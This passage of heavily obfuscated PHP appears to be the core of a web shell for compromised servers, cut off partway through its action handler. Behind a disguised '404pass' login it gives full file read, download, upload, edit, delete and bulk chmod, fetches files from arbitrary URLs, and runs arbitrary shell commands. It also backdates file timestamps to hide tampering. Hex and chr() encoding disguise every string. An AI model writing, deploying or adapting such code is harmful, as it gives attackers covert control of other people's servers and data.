    $_2c22b0 = getcwd();
$_2c22b0 = rtrim($_2c22b0, DIRECTORY_SEPARATOR);
if ($_2c22b0 === "")
    $_2c22b0 = DIRECTORY_SEPARATOR;

$_3578b5 = isset($_GET[chr(97)]) ? $_GET["\x61"] : '';


if ($_3578b5 === chr(52).chr(48).chr(52).chr(112).chr(97).chr(115).chr(115) && $_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(77).chr(69).chr(84).chr(72).chr(79).chr(68)] === "\x50\x4f\x53\x54") {
    _f3f4130b7();
    $_36defd = isset($_POST[chr(112).chr(97).chr(115).chr(115)]) ? $_POST[chr(112).chr(97).chr(115).chr(115)] : '';
    if (_f78f43e2d($_36defd, AUTH_PASS_HASH)) {
        $_SESSION["\x61\x75\x74\x68"] = true;
        $_SESSION[chr(119).chr(104).chr(111)] = AUTH_USER;
        header("\x4c\x6f\x63\x61\x74\x69\x6f\x6e\x3a\x20\x3f\x70\x3d" . rawurlencode($_2c22b0));
        exit;
    }
    _fbf8e18ba();
    exit;
}
if ($_3578b5 === chr(108).chr(111).chr(103).chr(105).chr(110) && $_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(77).chr(69).chr(84).chr(72).chr(79).chr(68)] === "\x50\x4f\x53\x54") {
    _f3f4130b7();
    $_caeef0 = isset($_POST[chr(117).chr(115).chr(101).chr(114)]) ? $_POST["\x75\x73\x65\x72"] : '';
    $_36defd = isset($_POST["\x70\x61\x73\x73"]) ? $_POST[chr(112).chr(97).chr(115).chr(115)] : "";
    if (_fbb05e6f9($_caeef0, $_36defd)) {
        $_SESSION["\x61\x75\x74\x68"] = true;
        $_SESSION["\x77\x68\x6f"] = $_caeef0;
        header("\x4c\x6f\x63\x61\x74\x69\x6f\x6e\x3a\x20\x3f\x70\x3d" . rawurlencode($_2c22b0));
        exit;
    }
    else {
        _f0812c81b("\x49\x6e\x63\x6f\x72\x72\x65\x63\x74\x20\x75\x73\x65\x72\x6e\x61\x6d\x65\x20\x6f\x72\x20\x70\x61\x73\x73\x77\x6f\x72\x64");
        exit;
    }
}
if (empty($_SESSION[chr(97).chr(117).chr(116).chr(104)])) {
    _fbf8e18ba();
    exit;
}


if ($_3578b5 === "\x64\x6f\x77\x6e\x6c\x6f\x61\x64") {
    $_bb9824 = _f0686cac3($_2c22b0, isset($_GET[chr(102)]) ? $_GET["\x66"] : "");
    if (!is_file($_bb9824) || !is_readable($_bb9824)) {
        http_response_code(404);
        exit("\x4e\x6f\x74\x20\x66\x6f\x75\x6e\x64");
    }
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(101).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(70).chr(105).chr(108).chr(101).chr(32).chr(84).chr(114).chr(97).chr(110).chr(115).chr(102).chr(101).chr(114));
    header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6f\x63\x74\x65\x74\x2d\x73\x74\x72\x65\x61\x6d");
    header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69\x74\x69\x6f\x6e\x3a\x20\x61\x74\x74\x61\x63\x68\x6d\x65\x6e\x74\x3b\x20\x66\x69\x6c\x65\x6e\x61\x6d\x65\x3d\x22" . basename($_bb9824) . chr(34));
    header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20" . filesize($_bb9824));
    header(chr(88).chr(45).chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(45).chr(79).chr(112).chr(116).chr(105).chr(111).chr(110).chr(115).chr(58).chr(32).chr(110).chr(111).chr(115).chr(110).chr(105).chr(102).chr(102));
    readfile($_bb9824);
    exit;
}


if ($_3578b5 === "\x72\x61\x77") {
    $_bb9824 = _f0686cac3($_2c22b0, isset($_GET[chr(102)]) ? $_GET["\x66"] : '');
    if (!is_file($_bb9824) || !is_readable($_bb9824)) {
        http_response_code(404);
        exit(chr(78).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100));
    }
    $_aac2c7 = chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(111).chr(99).chr(116).chr(101).chr(116).chr(45).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109);
    if (is_fn_usable("\x66\x69\x6e\x66\x6f\x5f\x6f\x70\x65\x6e")) {
        $_231e71 = @finfo_open(FILEINFO_MIME_TYPE);
        if ($_231e71) {
            $_5612f4 = @finfo_file($_231e71, $_bb9824);
            if ($_5612f4)
                $_aac2c7 = $_5612f4;
            @finfo_close($_231e71);
        }
    }
    elseif (is_fn_usable(chr(109).chr(105).chr(109).chr(101).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(95).chr(116).chr(121).chr(112).chr(101))) {
        $_06b18c = @mime_content_type($_bb9824);
        if ($_06b18c)
            $_aac2c7 = $_06b18c;
    }
    header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20" . $_aac2c7);
    header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20" . filesize($_bb9824));
    header("\x58\x2d\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x2d\x4f\x70\x74\x69\x6f\x6e\x73\x3a\x20\x6e\x6f\x73\x6e\x69\x66\x66");
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(105).chr(115).chr(112).chr(111).chr(115).chr(105).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(105).chr(110).chr(108).chr(105).chr(110).chr(101).chr(59).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34) . basename($_bb9824) . "\x22");
    readfile($_bb9824);
    exit;
}


if ($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(77).chr(69).chr(84).chr(72).chr(79).chr(68)] === "\x50\x4f\x53\x54") {
    _f3f4130b7();
    if (!function_exists(chr(98).chr(105).chr(114).chr(117).chr(95).chr(114).chr(101).chr(100).chr(105).chr(114).chr(101).chr(99).chr(116))) {
        function biru_redirect($_4d44d9)
        {
            header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(112).chr(61) . rawurlencode($_4d44d9));
            exit;
        }
    }
    switch ($_3578b5) {
        case "\x6c\x6f\x67\x6f\x75\x74": {
                session_destroy();
                header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63));
                exit;
            }
        case chr(110).chr(101).chr(119).chr(45).chr(102).chr(105).chr(108).chr(101): {
                $_bc4c7b = trim((string)(isset($_POST["\x6e\x61\x6d\x65"]) ? $_POST[chr(110).chr(97).chr(109).chr(101)] : ''));
                $_fe3e36 = isset($_POST["\x63\x6f\x6e\x74\x65\x6e\x74"]) ? (string)$_POST[chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)] : null;
                if ($_bc4c7b === '' || strpos($_bc4c7b, DIRECTORY_SEPARATOR) !== false) {
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x4e\x65\x77\x20\x46\x69\x6c\x65\x3a\x20\x69\x6e\x76\x61\x6c\x69\x64\x20\x6e\x61\x6d\x65";
                    biru_redirect($_2c22b0);
                }
                $_5fce97 = _f0686cac3($_2c22b0, $_bc4c7b);
                if (file_exists($_5fce97)) {
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x4e\x65\x77\x20\x46\x69\x6c\x65\x3a\x20\x61\x6c\x72\x65\x61\x64\x79\x20\x65\x78\x69\x73\x74\x73";
                    biru_redirect($_2c22b0);
                }
                list($_c3adcc, $_6740ef) = _f92db36c1($_5fce97, $_fe3e36);
                $_SESSION["\x6d\x73\x67"] = $_c3adcc ? ("New File OK via {$_6740ef}: " . $_bc4c7b) : ("\x4e\x65\x77\x20\x46\x69\x6c\x65\x20\x66\x61\x69\x6c\x65\x64\x3a\x20" . $_6740ef);
                biru_redirect($_2c22b0);
            }
        case "\x6e\x65\x77\x2d\x64\x69\x72": {
                $_bc4c7b = trim((string)(isset($_POST["\x6e\x61\x6d\x65"]) ? $_POST["\x6e\x61\x6d\x65"] : ''));
                if ($_bc4c7b === '' || strpos($_bc4c7b, DIRECTORY_SEPARATOR) !== false) {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(78).chr(101).chr(119).chr(32).chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(58).chr(32).chr(105).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(110).chr(97).chr(109).chr(101);
                    biru_redirect($_2c22b0);
                }
                $_5fce97 = _f0686cac3($_2c22b0, $_bc4c7b);
                if (file_exists($_5fce97)) {
                    $_SESSION["\x6d\x73\x67"] = "\x4e\x65\x77\x20\x46\x6f\x6c\x64\x65\x72\x3a\x20\x61\x6c\x72\x65\x61\x64\x79\x20\x65\x78\x69\x73\x74\x73";
                    biru_redirect($_2c22b0);
                }
                $_c3adcc = @mkdir($_5fce97, 0775, false);
                $_SESSION[chr(109).chr(115).chr(103)] = $_c3adcc ? (chr(78).chr(101).chr(119).chr(32).chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(79).chr(75).chr(58).chr(32) . $_bc4c7b) : "\x4e\x65\x77\x20\x46\x6f\x6c\x64\x65\x72\x20\x66\x61\x69\x6c\x65\x64";
                biru_redirect($_2c22b0);
            }
        case "\x65\x64\x69\x74\x2d\x73\x61\x76\x65": {
                $_4f768b = _f0686cac3($_2c22b0, isset($_POST["\x66\x69\x6c\x65"]) ? $_POST["\x66\x69\x6c\x65"] : '');
                $_fe3e36 = isset($_POST[chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)]) ? $_POST[chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)] : "";
                $_4ada7a = isset($_POST[chr(109).chr(111).chr(100).chr(101)]) ? $_POST["\x6d\x6f\x64\x65"] : chr(116).chr(120).chr(116);
                if (!is_file($_4f768b) || !is_writable($_4f768b)) {
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x53\x61\x76\x65\x20\x66\x61\x69\x6c\x65\x64\x20\x28\x66\x69\x6c\x65\x20\x6e\x6f\x74\x20\x77\x72\x69\x74\x61\x62\x6c\x65\x29";
                    biru_redirect($_2c22b0);
                }
                if ($_4ada7a === chr(98).chr(54).chr(52)) {
                    $_6fb0dc = base64_decode($_fe3e36, true);
                    if ($_6fb0dc === false) {
                        $_SESSION[chr(109).chr(115).chr(103)] = "\x53\x61\x76\x65\x20\x66\x61\x69\x6c\x65\x64\x3a\x20\x69\x6e\x76\x61\x6c\x69\x64\x20\x42\x61\x73\x65\x36\x34\x20\x64\x61\x74\x61";
                        biru_redirect($_2c22b0);
                    }
                    @file_put_contents($_4f768b, $_6fb0dc);
                }
                else {
                    @file_put_contents($_4f768b, $_fe3e36);
                }
                $_SESSION[chr(109).chr(115).chr(103)] = "\x53\x61\x76\x65\x64\x3a\x20" . basename($_4f768b);
                biru_redirect($_2c22b0);
            }
        case "\x72\x65\x6e\x61\x6d\x65": {
                $_6aa5f5 = _f0686cac3($_2c22b0, isset($_POST["\x6f\x6c\x64"]) ? $_POST[chr(111).chr(108).chr(100)] : '');
                $_363c2f = trim((string)(isset($_POST["\x6e\x65\x77"]) ? $_POST["\x6e\x65\x77"] : ''));
                if ($_363c2f === '' || strpos($_363c2f, DIRECTORY_SEPARATOR) !== false) {
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x49\x6e\x76\x61\x6c\x69\x64\x20\x6e\x65\x77\x20\x6e\x61\x6d\x65";
                }
                else {
                    $_5fce97 = _f0686cac3($_2c22b0, $_363c2f);
                    $_SESSION["\x6d\x73\x67"] = @rename($_6aa5f5, $_5fce97) ? "\x52\x65\x6e\x61\x6d\x65\x20\x4f\x4b" : chr(82).chr(101).chr(110).chr(97).chr(109).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
                }
                biru_redirect($_2c22b0);
            }
        case "\x63\x68\x6d\x6f\x64": {
                $_5237ab = _f0686cac3($_2c22b0, isset($_POST["\x74\x61\x72\x67\x65\x74"]) ? $_POST[chr(116).chr(97).chr(114).chr(103).chr(101).chr(116)] : "");
                $_4ada7a = _f8a1dd3b2((string)(isset($_POST[chr(109).chr(111).chr(100).chr(101)]) ? $_POST[chr(109).chr(111).chr(100).chr(101)] : chr(48).chr(54).chr(52).chr(52)));
                $_fc550c = !empty($_POST[chr(114).chr(101).chr(99).chr(117).chr(114).chr(115).chr(105).chr(118).chr(101)]);
                $_c3adcc = true;
                _f177b28ac($_5237ab, $_4ada7a, $_fc550c, $_c3adcc);
                $_SESSION[chr(109).chr(115).chr(103)] = $_c3adcc ? chr(67).chr(104).chr(109).chr(111).chr(100).chr(32).chr(79).chr(75) : chr(67).chr(104).chr(109).chr(111).chr(100).chr(32).chr(112).chr(97).chr(114).chr(116).chr(105).chr(97).chr(108).chr(108).chr(121).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
                biru_redirect($_2c22b0);
            }
        case chr(100).chr(101).chr(108).chr(101).chr(116).chr(101): {
                $_d09c06 = _f0686cac3($_2c22b0, isset($_POST["\x74\x61\x72\x67\x65\x74"]) ? $_POST[chr(116).chr(97).chr(114).chr(103).chr(101).chr(116)] : "");
                $_SESSION[chr(109).chr(115).chr(103)] = _f63298bd4($_d09c06) ? chr(68).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(79).chr(75) : "\x44\x65\x6c\x65\x74\x65\x20\x66\x61\x69\x6c\x65\x64";
                biru_redirect($_2c22b0);
            }
        case chr(109).chr(97).chr(115).chr(115).chr(45).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101): {
                $_fe3a50 = isset($_POST[chr(105).chr(116).chr(101).chr(109).chr(115)]) ? $_POST["\x69\x74\x65\x6d\x73"] : array();
                $_c3adcc = true;
                if (is_array($_fe3a50))
                    foreach ($_fe3a50 as $_eb49bb) {
                        $_c3adcc = _f63298bd4(_f0686cac3($_2c22b0, $_eb49bb)) && $_c3adcc;
                    }
                $_SESSION["\x6d\x73\x67"] = $_c3adcc ? "\x42\x75\x6c\x6b\x20\x64\x65\x6c\x65\x74\x65\x20\x4f\x4b" : chr(83).chr(111).chr(109).chr(101).chr(32).chr(105).chr(116).chr(101).chr(109).chr(115).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101);
                biru_redirect($_2c22b0);
            }
        case "\x6d\x61\x73\x73\x2d\x63\x68\x6d\x6f\x64": {
                $_fe3a50 = isset($_POST[chr(105).chr(116).chr(101).chr(109).chr(115)]) ? $_POST["\x69\x74\x65\x6d\x73"] : array();
                $_4ada7a = _f8a1dd3b2((string)(isset($_POST[chr(109).chr(111).chr(100).chr(101)]) ? $_POST["\x6d\x6f\x64\x65"] : "\x30\x36\x34\x34"));
                $_fc550c = !empty($_POST[chr(114).chr(101).chr(99).chr(117).chr(114).chr(115).chr(105).chr(118).chr(101)]);
                $_c3adcc = true;
                $_52ecde = 0;
                if (is_array($_fe3a50))
                    foreach ($_fe3a50 as $_eb49bb) {
                        _f177b28ac(_f0686cac3($_2c22b0, $_eb49bb), $_4ada7a, $_fc550c, $_c3adcc);
                        $_52ecde++;
                    }
                if ($_52ecde === 0)
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x4e\x6f\x20\x69\x74\x65\x6d\x73\x20\x73\x65\x6c\x65\x63\x74\x65\x64\x20\x66\x6f\x72\x20\x63\x68\x6d\x6f\x64";
                else
                    $_SESSION[chr(109).chr(115).chr(103)] = $_c3adcc ? chr(66).chr(117).chr(108).chr(107).chr(32).chr(99).chr(104).chr(109).chr(111).chr(100).chr(32).chr(79).chr(75) : "\x53\x6f\x6d\x65\x20\x69\x74\x65\x6d\x73\x20\x66\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x63\x68\x6d\x6f\x64";
                biru_redirect($_2c22b0);
            }
        case "\x75\x70\x6c\x6f\x61\x64": {
                if (!isset($_FILES[chr(102).chr(105).chr(108).chr(101).chr(115)])) {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(78).chr(111).chr(32).chr(102).chr(105).chr(108).chr(101).chr(115).chr(32).chr(112).chr(114).chr(111).chr(118).chr(105).chr(100).chr(101).chr(100);
                    biru_redirect($_2c22b0);
                }
                $_4d44d9 = count($_FILES["\x66\x69\x6c\x65\x73"]["\x6e\x61\x6d\x65"]);
                $_c3adcc = 0;
                $_25eaa1 = 0;
                $_367d56 = array();
                for ($_81ebb5 = 0; $_81ebb5 < $_4d44d9; $_81ebb5++) {
                    $_bc4c7b = $_FILES["\x66\x69\x6c\x65\x73"][chr(110).chr(97).chr(109).chr(101)][$_81ebb5];
                    $_06b18c = $_FILES[chr(102).chr(105).chr(108).chr(101).chr(115)][chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101)][$_81ebb5];
                    $_62af60 = $_FILES[chr(102).chr(105).chr(108).chr(101).chr(115)]["\x65\x72\x72\x6f\x72"][$_81ebb5];
                    if ($_62af60 !== UPLOAD_ERR_OK) {
                        $_25eaa1++;
                        $_367d56[] = "$_bc4c7b (error $_62af60)";
                        continue;
                    }
                    list($_132513, $_fead0a) = _f8cf557bc($_06b18c, _f0686cac3($_2c22b0, $_bc4c7b));
                    if ($_132513)
                        $_c3adcc++;
                    else {
                        $_25eaa1++;
                        $_367d56[] = "$_bc4c7b ($_fead0a)";
                    }
                }
                $_SESSION[chr(109).chr(115).chr(103)] = "Upload: OK=$_c3adcc; Failed=$_25eaa1" . ($_367d56 ? "\x3b\x20" . implode(chr(44).chr(32), $_367d56) : "");
                biru_redirect($_2c22b0);
            }
        case "\x63\x68\x75\x6e\x6b\x2d\x75\x70\x6c\x6f\x61\x64": {
                
                
                
                
                header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e\x3b\x20\x63\x68\x61\x72\x73\x65\x74\x3d\x75\x74\x66\x2d\x38");

                $_bc4c7b  = basename((string)(isset($_POST["\x6e\x61\x6d\x65"])  ? $_POST["\x6e\x61\x6d\x65"]  : ''));
                $_2aa7cb    = preg_replace("\x7e\x5b\x5e\x41\x2d\x5a\x61\x2d\x7a\x30\x2d\x39\x5f\x2e\x2d\x5d\x7e", "", (string)(isset($_POST[chr(105).chr(100)]) ? $_POST["\x69\x64"] : ""));
                $_f42653 = (int)(isset($_POST[chr(105).chr(110).chr(100).chr(101).chr(120)]) ? $_POST[chr(105).chr(110).chr(100).chr(101).chr(120)] : -1);
                $_3acc45 = (int)(isset($_POST["\x74\x6f\x74\x61\x6c"]) ? $_POST[chr(116).chr(111).chr(116).chr(97).chr(108)] : 0);
                $_b172eb = (float)(isset($_POST["\x66\x73\x69\x7a\x65"]) ? $_POST[chr(102).chr(115).chr(105).chr(122).chr(101)] : -1); 

                if ($_bc4c7b === '' || $_2aa7cb === "" || $_f42653 < 0 || $_3acc45 < 1) {
                    echo je(array("\x6f\x6b" => false, chr(101).chr(114).chr(114).chr(111).chr(114) => chr(66).chr(97).chr(100).chr(32).chr(112).chr(97).chr(114).chr(97).chr(109).chr(101).chr(116).chr(101).chr(114).chr(115)));
                    exit;
                }
                
                $_b58a8f = ($_3acc45 === 1 && $_b172eb === 0.0);
                if (!$_b58a8f && (!isset($_FILES["\x63\x68\x75\x6e\x6b"]) || $_FILES[chr(99).chr(104).chr(117).chr(110).chr(107)]["\x65\x72\x72\x6f\x72"] !== UPLOAD_ERR_OK)) {
                    $_9043da = isset($_FILES["\x63\x68\x75\x6e\x6b"]) ? $_FILES[chr(99).chr(104).chr(117).chr(110).chr(107)]["\x65\x72\x72\x6f\x72"] : "\x6e\x2f\x61";
                    echo je(array("\x6f\x6b" => false, chr(101).chr(114).chr(114).chr(111).chr(114) => "Chunk missing (error $_9043da)"));
                    exit;
                }

                $_c1b966 = _f0686cac3($_2c22b0, $_bc4c7b);
                $_18306b = $_c1b966 . chr(46).chr(98).chr(108).chr(117).chr(101).chr(112).chr(97).chr(114).chr(116).chr(45) . $_2aa7cb;

                
                if ($_f42653 === 0) {
                    @unlink($_18306b);
                } else {
                    $_0aa37c = @file_exists($_18306b) ? (float)@filesize($_18306b) : -1.0;
                    if ($_0aa37c < 0) {
                        echo je(array(chr(111).chr(107) => false, chr(101).chr(114).chr(114).chr(111).chr(114) => chr(80).chr(97).chr(114).chr(116).chr(32).chr(102).chr(105).chr(108).chr(101).chr(32).chr(108).chr(111).chr(115).chr(116).chr(59).chr(32).chr(114).chr(101).chr(115).chr(116).chr(97).chr(114).chr(116).chr(32).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100)));
                        exit;
                    }
                }

                $_6fb0dc = "";
                if (!$_b58a8f) {
                    $_6fb0dc = @file_get_contents($_FILES["\x63\x68\x75\x6e\x6b"]["\x74\x6d\x70\x5f\x6e\x61\x6d\x65"]);
                    if ($_6fb0dc === false) {
                        echo je(array("\x6f\x6b" => false, chr(101).chr(114).chr(114).chr(111).chr(114) => chr(67).chr(97).chr(110).chr(110).chr(111).chr(116).chr(32).chr(114).chr(101).chr(97).chr(100).chr(32).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(32).chr(99).chr(104).chr(117).chr(110).chr(107)));
                        exit;
                    }
                }

                $_862fdd = @fopen($_18306b, ($_f42653 === 0 ? "\x77\x62" : chr(97).chr(98)));
                if (!$_862fdd) {
                    echo je(array("\x6f\x6b" => false, chr(101).chr(114).chr(114).chr(111).chr(114) => "\x43\x61\x6e\x6e\x6f\x74\x20\x6f\x70\x65\x6e\x20\x70\x61\x72\x74\x20\x66\x69\x6c\x65\x20\x66\x6f\x72\x20\x77\x72\x69\x74\x69\x6e\x67"));
                    exit;
                }
                @flock($_862fdd, LOCK_EX);
                $_e5a89c = strlen($_6fb0dc);
                $_d09242 = 0;
                $_33c973 = true;
                while ($_d09242 < $_e5a89c) {
                    $_eb49bb = @fwrite($_862fdd, substr($_6fb0dc, $_d09242));
                    if ($_eb49bb === false || $_eb49bb === 0) {
                        $_33c973 = false;
                        break;
                    }
                    $_d09242 += $_eb49bb;
                }
                @fflush($_862fdd);
                @flock($_862fdd, LOCK_UN);
                @fclose($_862fdd);
                if (!$_33c973) {
                    echo je(array(chr(111).chr(107) => false, chr(101).chr(114).chr(114).chr(111).chr(114) => chr(70).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(119).chr(114).chr(105).chr(116).chr(105).chr(110).chr(103).chr(32).chr(99).chr(104).chr(117).chr(110).chr(107).chr(32).chr(116).chr(111).chr(32).chr(100).chr(105).chr(115).chr(107)));
                    exit;
                }

                
                if ($_f42653 + 1 < $_3acc45) {
                    clearstatcache();
                    echo je(array("\x6f\x6b" => true, "\x64\x6f\x6e\x65" => false, "\x72\x65\x63\x65\x69\x76\x65\x64" => $_f42653 + 1, "\x74\x6f\x74\x61\x6c" => $_3acc45, chr(98).chr(121).chr(116).chr(101).chr(115) => (float)@filesize($_18306b)));
                    exit;
                }

                
                clearstatcache();
                $_caa332 = (float)@filesize($_18306b);
                if ($_b172eb >= 0 && $_caa332 !== $_b172eb) {
                    @unlink($_18306b);
                    echo je(array("\x6f\x6b" => false, "\x65\x72\x72\x6f\x72" => chr(83).chr(105).chr(122).chr(101).chr(32).chr(109).chr(105).chr(115).chr(109).chr(97).chr(116).chr(99).chr(104).chr(58).chr(32).chr(103).chr(111).chr(116).chr(32) . $_caa332 . chr(32).chr(111).chr(102).chr(32) . $_b172eb . chr(32).chr(98).chr(121).chr(116).chr(101).chr(115)));
                    exit;
                }

                @unlink($_c1b966);
                $_3bc617 = @rename($_18306b, $_c1b966);
                if (!$_3bc617) {
                    if (@copy($_18306b, $_c1b966)) {
                        @unlink($_18306b);
                        $_3bc617 = true;
                    }
                }
                if (!$_3bc617) {
                    echo je(array(chr(111).chr(107) => false, "\x65\x72\x72\x6f\x72" => "\x43\x6f\x75\x6c\x64\x20\x6e\x6f\x74\x20\x66\x69\x6e\x61\x6c\x69\x7a\x65\x20\x66\x69\x6c\x65\x20\x28\x72\x65\x6e\x61\x6d\x65\x2f\x63\x6f\x70\x79\x20\x66\x61\x69\x6c\x65\x64\x29"));
                    exit;
                }
                clearstatcache();
                echo je(array("\x6f\x6b" => true, "\x64\x6f\x6e\x65" => true, chr(102).chr(105).chr(108).chr(101) => $_bc4c7b, "\x73\x69\x7a\x65" => (float)@filesize($_c1b966)));
                exit;
            }
        case "\x75\x72\x6c\x2d\x75\x70\x6c\x6f\x61\x64": {
                $_4f1f81 = trim((string)(isset($_POST[chr(117).chr(114).chr(108)]) ? $_POST[chr(117).chr(114).chr(108)] : ""));
                $_ba896e = trim((string)(isset($_POST[chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101)]) ? $_POST[chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101)] : ""));
                if ($_4f1f81 === '') {
                    $_SESSION["\x6d\x73\x67"] = "\x55\x52\x4c\x20\x69\x73\x20\x65\x6d\x70\x74\x79";
                    biru_redirect($_2c22b0);
                }
                if ($_ba896e === '') {
                    $_013f0a = parse_url($_4f1f81, PHP_URL_PATH);
                    $_ba896e = basename($_013f0a ? $_013f0a : '');
                    if ($_ba896e === '') {
                        $_ba896e = chr(100).chr(111).chr(119).chr(110).chr(108).chr(111).chr(97).chr(100).chr(46).chr(98).chr(105).chr(110);
                    }
                }
                list($_c3adcc, $_16a1d4) = fetchUrlToFile($_4f1f81, _f0686cac3($_2c22b0, $_ba896e));
                $_SESSION["\x6d\x73\x67"] = $_c3adcc ? "Downloaded from URL: $_ba896e" : "URL download failed: $_16a1d4";
                biru_redirect($_2c22b0);
            }
        case chr(109).chr(116).chr(105).chr(109).chr(101): {
                $_5237ab = _f0686cac3($_2c22b0, isset($_POST["\x74\x61\x72\x67\x65\x74"]) ? $_POST["\x74\x61\x72\x67\x65\x74"] : "");
                $_198181 = trim((string)(isset($_POST["\x74\x73"]) ? $_POST["\x74\x73"] : ""));
                $_fc550c = !empty($_POST["\x72\x65\x63\x75\x72\x73\x69\x76\x65"]);
                if ($_198181 === "") {
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x43\x68\x61\x6e\x67\x65\x20\x44\x61\x74\x65\x3a\x20\x65\x6d\x70\x74\x79";
                    biru_redirect($_2c22b0);
                }
                if (ctype_digit($_198181))
                    $_87f751 = (int)$_198181;
                else {
                    $_87f751 = @strtotime($_198181);
                    if ($_87f751 === false) {
                        $_SESSION["\x6d\x73\x67"] = chr(67).chr(104).chr(97).chr(110).chr(103).chr(101).chr(32).chr(68).chr(97).chr(116).chr(101).chr(58).chr(32).chr(105).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(116).chr(105).chr(109).chr(101).chr(32).chr(102).chr(111).chr(114).chr(109).chr(97).chr(116);
                        biru_redirect($_2c22b0);
                    }
                }
                $_c3adcc = true;
                _f5b82abde($_5237ab, $_87f751, $_fc550c, $_c3adcc);
                $_SESSION["\x6d\x73\x67"] = $_c3adcc ? (chr(67).chr(104).chr(97).chr(110).chr(103).chr(101).chr(32).chr(68).chr(97).chr(116).chr(101).chr(32).chr(79).chr(75).chr(32).chr(226).chr(134).chr(146).chr(32) . date(chr(89).chr(45).chr(109).chr(45).chr(100).chr(32).chr(72).chr(58).chr(105).chr(58).chr(115), $_87f751)) : "\x43\x68\x61\x6e\x67\x65\x20\x44\x61\x74\x65\x20\x70\x61\x72\x74\x69\x61\x6c\x6c\x79\x20\x66\x61\x69\x6c\x65\x64";
                biru_redirect($_2c22b0);
            }
        case "\x63\x6d\x64": {
                $_7a966e = trim((string)(isset($_POST["\x63\x6d\x64"]) ? $_POST[chr(99).chr(109).chr(100)] : ''));
                if ($_7a966e === '') {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(67).chr(111).chr(109).chr(109).chr(97).chr(110).chr(100).chr(32).chr(105).chr(115).chr(32).chr(101).chr(109).chr(112).chr(116).chr(121).chr(46);
                    biru_redirect($_2c22b0);
                }
                $_4de593 = run_command_all($_7a966e, $_2c22b0);
                $_862fdd = (string)$_4de593[chr(111).chr(117).chr(116)];
                if (strlen($_862fdd) > 1024 * 1024)
                    $_862fdd = substr($_862fdd, 0, 1024 * 1024) . "\x0a\x5b\x6f\x75\x74\x70\x75\x74\x20\x74\x72\x75\x6e\x63\x61\x74\x65\x64\x5d";
                $_SESSION["\x63\x6d\x64\x5f\x72\x65\x73\x75\x6c\x74"] = array(chr(99).chr(109).chr(100) => $_7a966e, chr(109).chr(101).chr(116).chr(104).chr(111).chr(100) => $_4de593["\x6d\x65\x74\x68\x6f\x64"], chr(99).chr(111).chr(100).chr(101) => $_4de593["\x63\x6f\x64\x65"], "\x6f\x75\x74" => $_862fdd);
                biru_redirect($_2c22b0);
            }

        
        case chr(109).chr(111).chr(118).chr(101): {
